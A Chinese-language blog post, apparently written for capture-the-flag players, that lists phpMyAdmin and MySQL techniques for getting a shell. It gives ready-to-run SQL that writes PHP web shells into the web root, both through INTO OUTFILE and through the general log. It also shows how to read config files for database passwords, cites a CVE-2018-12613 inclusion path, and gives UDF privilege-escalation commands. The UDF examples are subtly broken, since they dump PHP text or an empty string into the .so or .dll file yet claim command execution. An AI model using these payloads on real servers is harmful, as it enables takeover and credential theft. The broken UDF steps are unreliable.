---
layout: post
title: phpMyadmin getShell方法
subtitle: phpMyadmin getShell
date: 2025-08-15 18:47
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags: 
number headings: first-level 2, max 4, 1.1., auto
published: true
---
## 1. phpMyAdmin getshell 常见套路

Windows 和 Linux 原理基本相同

### 1.1. `INTO OUTFILE` 写 PHP 马

**原理**：MySQL 可以把查询结果直接写到服务器文件系统，如果 Web 目录可写，就能写一段 PHP 代码变成 WebShell。

**条件检查：**

```sql
SHOW VARIABLES LIKE 'secure_file_priv'; 
SHOW GRANTS FOR CURRENT_USER();
```

- `secure_file_priv` 为空或是 Web 根目录。
- 当前用户有 `FILE` 权限。

**利用：**

```sql
select @@basedir;  -- 查找绝对路径
-- linux
SELECT '<?php system($_REQUEST["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php';
-- windows
SELECT '<?php eval($_REQUEST["cmd"]);?>' INTO OUTFILE 'c:\phpstudy\www\shell.php';
```

**CTF 变种：**

- 出题人可能会限制 `secure_file_priv`，这时需要找 **符号链接绕过** 或 **mysql 日志写马**

### 1.2. 利用 MySQL 日志写 WebShell

**原理**：MySQL 的 general log、slow log 可以记录 SQL 语句到文件。通过设置日志路径到 Web 目录，就能写 PHP 代码。

**操作：**

```sql
SET global general_log = 'ON'; 
SET global general_log_file = '/var/www/html/shell.php'; 
SELECT '<?php system($_GET["cmd"]); ?>'; 
SET global general_log = 'OFF';
```

访问 `shell.php` 即可。

### 1.3. `LOAD_FILE` 读取敏感文件

虽然不是直接 getshell，但可以辅助：

```sql
SELECT LOAD_FILE('/var/www/html/config.php');
```

可能拿到数据库连接密码，从而用其他方式 getshell。

### 1.4. 导入功能绕过上传限制

在 phpMyAdmin 的 “导入” 页面上传 `.php` 文件，出题人可能没有过滤，或者导入路径就是 Web 可访问路径。

- 常见的 CTF trick：导入 `.txt` 文件，但内容是 PHP 代码，然后用双扩展名 `shell.php.txt`，再通过 `.htaccess` 把 `.txt` 解析成 PHP。

### 1.5. 创建数据库和表写入 WebShell

```sql
CREATE TABLE test( id text(500) not null);
INSERT INTO test (id) VALUES('<?php @eval($_POST[cmd]);?>');
SELECT id FROM test INTO OUTFILE 'C:/phpstudy/WWW/1.php';
DROP TABLE IF EXISTS test;
```

### 1.6. phpMyAdmin 历史漏洞 getshell

在 CTF 中常用老版本 phpMyAdmin：

- **CVE-2018-12613**：文件包含漏洞，可以通过 `?target=db_sql.php%253f/../../../../.../shell` 来执行任意文件。
- **CVE-2016-5734**：SQL 执行漏洞，配合 OUTFILE 直接 getshell。

### 1.7. MySQL UDF 提权

#### 1.7.1. Linux

如果 MySQL 用户有 `FILE` 权限且是 root 运行，可以写入 `.so` 动态库到插件目录，创建自定义函数执行系统命令：

```sql
SELECT '<?php eval($_POST[a]);?>' INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'; SELECT sys_eval('id');
```

但 CTF 中较少，因为需要 root 权限。

#### 1.7.2. Windows

如果 MySQL 服务在 Windows 上以 `SYSTEM` 运行，且有 `FILE` 权限，可以写 DLL 到 `plugin` 目录，注册自定义函数执行系统命令：

```sql
SELECT '' INTO DUMPFILE 'C:\\Program Files\\MySQL\\MySQL Server 5.7\\lib\\plugin\\udf.dll';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll';
SELECT sys_eval('whoami');
```

CTF 偶尔会出，真实环境比较少见
